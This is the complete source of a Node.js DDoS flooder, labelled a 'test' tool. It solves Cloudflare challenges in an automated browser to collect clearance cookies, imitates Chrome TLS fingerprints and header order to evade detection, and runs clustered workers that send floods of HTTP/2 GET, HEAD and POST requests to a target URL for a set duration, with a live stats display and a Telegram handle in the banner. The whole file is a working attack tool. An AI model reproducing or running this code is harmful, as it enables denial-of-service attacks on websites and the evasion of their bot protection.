const { connect } = require("puppeteer-real-browser");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");

// ** ADVANCED TLS FINGERPRINTING **
function getAdvancedChromeTlsOptions(parsedTarget) {
    const chromeProfiles = [
        {
            version: 131,
            ciphers: [
                'TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256',
                'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-RSA-AES128-GCM-SHA256',
                'ECDHE-ECDSA-AES256-GCM-SHA384', 'ECDHE-RSA-AES256-GCM-SHA384'
            ]
        },
        {
            version: 132,
            ciphers: [
                'TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256',
                'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-RSA-AES128-GCM-SHA256',
                'ECDHE-ECDSA-CHACHA20-POLY1305', 'ECDHE-RSA-CHACHA20-POLY1305'
            ]
        }
    ];

    const profile = chromeProfiles[Math.floor(Math.random() * chromeProfiles.length)];
    const supportedGroups = ['x25519', 'secp256r1', 'secp384r1', 'secp521r1'];
    const sigAlgs = [
        'ecdsa_secp256r1_sha256', 'rsa_pss_rsae_sha256', 'rsa_pkcs1_sha256',
        'ecdsa_secp384r1_sha384', 'rsa_pss_rsae_sha384', 'rsa_pkcs1_sha384'
    ];

    return {
        ciphers: profile.ciphers.join(':'),
        sigalgs: sigAlgs.join(':'),
        groups: supportedGroups.join(':'),
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3',
        secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET |
                       crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 |
                       crypto.constants.SSL_OP_NO_COMPRESSION,
        rejectUnauthorized: false,
        servername: parsedTarget.host
    };
}

// ** ADVANCED BROWSER HEADERS **
function generateAdvancedBrowserHeaders(userAgentFromBypass) {
    const chromeVersion = parseInt((userAgentFromBypass.match(/Chrome\/(\d+)/) || [])[1] || '131');
    const fullVersion = `${chromeVersion}.0.${Math.floor(Math.random() * 5000)}.${Math.floor(Math.random() * 100)}`;

    const brandTemplates = [
        `"Google Chrome";v="${chromeVersion}", "Chromium";v="${chromeVersion}", "Not-A.Brand";v="99"`,
        `"Microsoft Edge";v="${chromeVersion}", "Chromium";v="${chromeVersion}", "Not-A.Brand";v="99"`,
        `"Not)A;Brand";v="99", "Google Chrome";v="${chromeVersion}", "Chromium";v="${chromeVersion}"`
    ];
    const brandValue = brandTemplates[Math.floor(Math.random() * brandTemplates.length)];

    const platforms = ['"Windows"', '"macOS"', '"Linux"', '"Android"'];
    const platform = platforms[Math.floor(Math.random() * platforms.length)];

    const headers = {
        "sec-ch-ua": brandValue,
        "sec-ch-ua-mobile": platform === '"Android"' ? "?1" : "?0",
        "sec-ch-ua-platform": platform,
        "sec-ch-ua-platform-version": `"${Math.floor(Math.random() * 15) + 10}.0.0"`,
        "sec-ch-ua-full-version-list": `"Not)A;Brand";v="${fullVersion}", "Chromium";v="${fullVersion}", "Google Chrome";v="${fullVersion}"`,
        "upgrade-insecure-requests": "1",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "sec-fetch-site": "none",
        "sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
        "sec-fetch-dest": "document",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "en-US,en;q=0.9,vi;q=0.8"
    };

    return headers;
}

// ** HEADER ORDER **
function getBrowserLikeHeaderOrder(method) {
    const baseOrder = [
        ':method', ':authority', ':scheme', ':path', 'user-agent',
        'sec-ch-ua', 'sec-ch-ua-mobile', 'sec-ch-ua-platform', 'sec-ch-ua-platform-version',
        'sec-ch-ua-full-version-list', 'upgrade-insecure-requests', 'accept',
        'sec-fetch-site', 'sec-fetch-mode', 'sec-fetch-user', 'sec-fetch-dest',
        'accept-encoding', 'accept-language', 'content-type', 'content-length', 'cookie'
    ];
    if (method === 'POST') {
        return baseOrder; // Đam bao content-type va content-length đuoc bao gom
    }
    return baseOrder.filter(h => h !== 'content-type' && h !== 'content-length');
}

function buildHeadersInOrder(headersObj, order) {
    const orderedHeaders = {};
    order.forEach(key => {
        if (headersObj.hasOwnProperty(key)) {
            orderedHeaders[key] = headersObj[key];
        }
    });
    return orderedHeaders;
}

// ** UTILITY FUNCTIONS **
function generateCacheBuster() {
    const params = ['_', 'cb', 't', 'cache', 'v'];
    const param = params[Math.floor(Math.random() * params.length)];
    return `${param}=${Date.now() + Math.floor(Math.random() * 10000)}`;
}

function randomDelay(min, max) {
    return new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * (max - min + 1)) + min));
}

function generatePostPayload() {
    const payloads = [
        JSON.stringify({ action: "test", id: Math.random().toString(36).substring(2), timestamp: Date.now() }),
        `query=${encodeURIComponent(Math.random().toString(36).substring(2))}&value=${Math.random()}`,
        JSON.stringify({ user: "testuser", session: Math.random().toString(36).substring(2) })
    ];
    return payloads[Math.floor(Math.random() * payloads.length)];
}

// ** BYPASS CLOUDFLARE **
async function bypassCloudflareOnce(attemptNum = 1) {
    let browser = null, page = null;
    try {
        console.log(`\x1b[33m🔄 Starting bypass attempt ${attemptNum}...\x1b[0m`);
        const response = await connect({
            headless: 'auto',
            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-gpu', '--window-size=1920,1080'],
            turnstile: true,
        });
        browser = response.browser;
        page = response.page;

        // Gia lap hanh vi nguoi dung
        await page.mouse.move(Math.random() * 800 + 100, Math.random() * 600 + 100);
        await randomDelay(500, 1500);
        await page.evaluate(() => window.scrollTo(0, Math.random() * 1000));
        await page.goto(args.target, { waitUntil: 'domcontentloaded', timeout: 45000 });

        console.log("\x1b[33m⏳ Checking for Cloudflare challenge...\x1b[0m");
        let challengeCompleted = false, waitCount = 0;
        while (!challengeCompleted && waitCount < 120) {
            await randomDelay(500, 1000);
            waitCount++;
            const cookies = await page.cookies();
            if (cookies.some(c => c.name === "cf_clearance")) {
                challengeCompleted = true;
                console.log(`\x1b[32m✅ cf_clearance cookie found after ${waitCount * 0.5} seconds.\x1b[0m`);
                break;
            }
            if (waitCount % 20 === 0) {
                console.log(`\x1b[33m⏳ Still waiting... (${waitCount * 0.5}s elapsed)\x1b[0m`);
            }
        }

        const cookies = await page.cookies();
        const userAgent = await page.evaluate(() => navigator.userAgent);
        await browser.close();

        if (!cookies.some(c => c.name === "cf_clearance")) {
            throw new Error("cf_clearance cookie not found.");
        }

        console.log(`\x1b[32m✅ Bypass attempt ${attemptNum} successful.\x1b[0m`);
        return { cookies, userAgent, success: true, attemptNum };
    } catch (error) {
        console.log(`\x1b[31m❌ Bypass attempt ${attemptNum} failed: ${error.message}\x1b[0m`);
        if (browser) await browser.close();
        return { cookies: [], userAgent: "", success: false, attemptNum };
    }
}

async function bypassCloudflareParallel(totalCount) {
    console.log("\x1b[35m╔════════════════════════════════════════════╗\x1b[0m");
    console.log("\x1b[35m║     CLOUDFLARE BYPASS - ULTRA MODE         ║\x1b[0m");
    console.log("\x1b[35m╚════════════════════════════════════════════╝\x1b[0m");

    const results = [];
    let attemptCount = 0;
    const batchSize = 7;

    while (results.length < totalCount) {
        const remaining = totalCount - results.length;
        const currentBatchSize = Math.min(batchSize, remaining);
        console.log(`\x1b[33m🔄 Starting batch (${currentBatchSize} sessions)...\x1b[0m`);

        const batchPromises = Array.from({ length: currentBatchSize }, () => bypassCloudflareOnce(++attemptCount));
        const batchResults = await Promise.all(batchPromises);

        for (const result of batchResults) {
            if (result.success) {
                results.push(result);
                console.log(`\x1b[32m✅ Session ${result.attemptNum} obtained! (Total: ${results.length}/${totalCount})\x1b[0m`);
            }
        }
        if (results.length < totalCount) await randomDelay(2000, 5000);
    }
    return results.length > 0 ? results : [{ cookies: [], userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36" }];
}

// ** FLOODER - Ho tro POST request **
async function runFlooder() {
    const bypassInfo = global.bypassData[Math.floor(Math.random() * global.bypassData.length)];
    if (!bypassInfo || !bypassInfo.userAgent) return;

    const cookieString = bypassInfo.cookies.map(c => `${c.name}=${c.value}`).join("; ");
    const advancedHeaders = generateAdvancedBrowserHeaders(bypassInfo.userAgent);
    const tlsOptions = getAdvancedChromeTlsOptions(parsedTarget);

    const client = http2.connect(args.target, {
        createConnection: (authority, option) => {
            return tls.connect({
                ...tlsOptions,
                port: 443,
                host: parsedTarget.host,
                ALPNProtocols: ['h2'],
            });
        },
        settings: {
            headerTableSize: 262144,
            maxConcurrentStreams: 250, // Tang đe xu ly nhieu request
            initialWindowSize: 10485760,
            maxHeaderListSize: 8192
        }
    });

    const connectionId = Math.random().toString(36).substring(2);
    global.activeConnections.add(connectionId);

    client.on('connect', async () => {
        const attackInterval = setInterval(async () => {
            if (client.destroyed) {
                clearInterval(attackInterval);
                return;
            }
            try {
                const requestPromises = Array.from({ length: args.Rate * 2 }, async () => {
                    await randomDelay(5, 30); // Giam delay đe tang req/s
                    const paths = [parsedTarget.path, `${parsedTarget.path}/index.html`, `${parsedTarget.path}/api`];
                    const querySeparator = parsedTarget.path.includes('?') ? '&' : '?';
                    const pathWithBuster = paths[Math.floor(Math.random() * paths.length)] + querySeparator + generateCacheBuster();

                    const method = Math.random() < 0.6 ? 'GET' : Math.random() < 0.8 ? 'HEAD' : 'POST';
                    let headers = {
                        ":method": method,
                        ":authority": parsedTarget.host,
                        ":scheme": "https",
                        ":path": pathWithBuster,
                        "user-agent": bypassInfo.userAgent,
                        "cookie": cookieString,
                        ...advancedHeaders
                    };

                    if (method === 'POST') {
                        const payload = generatePostPayload();
                        headers['content-type'] = payload.startsWith('query=') ? 'application/x-www-form-urlencoded' : 'application/json';
                        headers['content-length'] = Buffer.byteLength(payload);
                    }

                    const headerOrder = getBrowserLikeHeaderOrder(method);
                    headers = buildHeadersInOrder(headers, headerOrder);

                    return new Promise(resolve => {
                        const req = client.request(headers);
                        if (method === 'POST') {
                            req.write(generatePostPayload());
                        }
                        req.on('response', (resHeaders) => {
                            const status = resHeaders[':status'];
                            if (!global.statuses[status]) global.statuses[status] = 0;
                            global.statuses[status]++;
                            global.totalRequests = (global.totalRequests || 0) + 1;
                            global.methodStats[method] = (global.methodStats[method] || 0) + 1;
                            req.close();
                            resolve();
                        });
                        req.on('error', () => {
                            if (!global.statuses["ERROR"]) global.statuses["ERROR"] = 0;
                            global.statuses["ERROR"]++;
                            global.totalRequests = (global.totalRequests || 0) + 1;
                            global.methodStats[method] = (global.methodStats[method] || 0) + 1;
                            req.close();
                            resolve();
                        });
                        req.end();
                    });
                });

                await Promise.all(requestPromises);
            } catch (e) {}
        }, 400); // Giam interval đe tang req/s

        setTimeout(() => {
            clearInterval(attackInterval);
            client.close();
        }, 30000);
    });

    const cleanup = () => {
        global.activeConnections.delete(connectionId);
        client.destroy();
    };
    client.on('error', cleanup);
    client.on('close', cleanup);
}

// ** STATS DISPLAY **
function displayStats() {
    const elapsed = Math.floor((Date.now() - global.startTime) / 1000);
    const remaining = Math.max(0, args.time - elapsed);

    console.clear();
    console.log("\x1b[35m╔════════════════════════════════════════════╗\x1b[0m");
    console.log("\x1b[35m║        VIP UAMv3 - ULTRA TEST MODE BY TELE @@honhatthuan111 Hồ Nhật Thuận Bá Sàn         ║\x1b[0m");
    console.log("\x1b[35m╚════════════════════════════════════════════╝\x1b[0m");
    console.log(`\x1b[36m🎯 Target:\x1b[0m ${args.target}`);
    console.log(`\x1b[36m⏱  Time:\x1b[0m ${elapsed}s / ${args.time}s`);
    console.log(`\x1b[36m⏳ Remaining:\x1b[0m ${remaining}s`);
    console.log(`\x1b[36m🔧 Config:\x1b[0m Rate: ${args.Rate}/s | Threads: ${args.threads} | Cookies: ${args.cookieCount}`);
    console.log(`\x1b[36m🍪 Active Sessions:\x1b[0m ${global.bypassData.length}`);
    console.log(`\x1b[36m🔗 Active Connections:\x1b[0m ${global.activeConnections.size}`);

    let totalStatuses = {};
    let totalRequests = 0;
    let methodStats = { GET: 0, HEAD: 0, POST: 0 };
    for (let w in global.workers) {
        if (global.workers[w][0].state == 'online') {
            const msg = global.workers[w][1];
            for (let st of msg.statusesQ) {
                for (let code in st) {
                    if (!totalStatuses[code]) totalStatuses[code] = 0;
                    totalStatuses[code] += st[code];
                }
            }
            totalRequests += msg.totalRequests || 0;
            for (let method in msg.methodStats) {
                methodStats[method] = (methodStats[method] || 0) + (msg.methodStats[method] || 0);
            }
        }
    }
    console.log(`\x1b[33m📊 Statistics:\x1b[0m`);
    console.log(`   \x1b[36m📈 Total Requests:\x1b[0m ${totalRequests}`);
    console.log(`   \x1b[33m⚡ Rate:\x1b[0m ${elapsed > 0 ? (totalRequests / elapsed).toFixed(2) : 0} req/s`);
    console.log(`   \x1b[32m🔧 Status Codes:\x1b[0m`, totalStatuses);
    console.log(`   \x1b[32m🔍 Method Stats:\x1b[0m`, methodStats);

    const progress = Math.floor((elapsed / args.time) * 30);
    const progressBar = "█".repeat(progress) + "░".repeat(30 - progress);
    console.log(`\n\x1b[36mProgress: [\x1b[32m${progressBar}\x1b[36m]\x1b[0m`);
}

// ** MAIN **
global.activeConnections = new Set();
global.workers = {};
global.startTime = Date.now();
global.bypassData = [];
global.methodStats = { GET: 0, HEAD: 0, POST: 0 };

if (process.argv.length < 7) {
    console.log("\x1b[31m❌ Usage: node test.js <target> <time> <rate> <threads> <cookieCount>\x1b[0m");
    console.log("\x1b[33mExample: node test.js https://yourwebsite.com 60 200 8 10\x1b[0m");
    process.exit(1);
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    cookieCount: parseInt(process.argv[6]) || 10
};

const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    console.clear();
    console.log("\x1b[35m╔════════════════════════════════════════════╗\x1b[0m");
    console.log("\x1b[35m║        VIP UAMv3 - ULTRA TEST MODE         ║\x1b[0m");
    console.log("\x1b[35m╚════════════════════════════════════════════╝\x1b[0m");

    (async () => {
        const bypassResults = await bypassCloudflareParallel(args.cookieCount);
        global.bypassData = bypassResults;

        console.log(`\x1b[32m✅ Obtained ${bypassResults.length} session(s)!\x1b[0m`);
        console.log("\x1b[32m🚀 Starting test...\x1b[0m");

        global.startTime = Date.now();

        for (let i = 0; i < args.threads; i++) {
            const worker = cluster.fork();
            worker.send({ type: 'bypassData', data: bypassResults, rate: args.Rate / args.threads });
        }

        const statsInterval = setInterval(displayStats, 1000);

        cluster.on('message', (worker, message) => {
            if (message.type === 'stats') {
                global.workers[worker.id] = [worker, message];
            }
        });

        cluster.on('exit', (worker) => {
            if (Date.now() - global.startTime < args.time * 1000) {
                const newWorker = cluster.fork();
                newWorker.send({ type: 'bypassData', data: global.bypassData, rate: args.Rate / args.threads });
            }
        });

        setTimeout(() => {
            clearInterval(statsInterval);
            console.log("\x1b[32m✅ Test completed!\x1b[0m");
            process.exit(0);
        }, args.time * 1000);
    })();
} else {
    let statusesQ = [];
    global.totalRequests = 0;
    global.statuses = {};
    global.methodStats = { GET: 0, HEAD: 0, POST: 0 };

    process.on('message', (msg) => {
        if (msg.type === 'bypassData') {
            global.bypassData = msg.data;
            args.Rate = msg.rate;
            setInterval(() => runFlooder(), 400);

            setInterval(() => {
                if (Object.keys(global.statuses).length > 0) {
                    if (statusesQ.length >= 4) statusesQ.shift();
                    statusesQ.push({ ...global.statuses });
                    global.statuses = {};
                }
                process.send({
                    type: 'stats',
                    statusesQ: statusesQ,
                    totalRequests: global.totalRequests,
                    methodStats: global.methodStats
                });
            }, 250);
        }
    });

    setTimeout(() => process.exit(0), args.time * 1000);
}

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
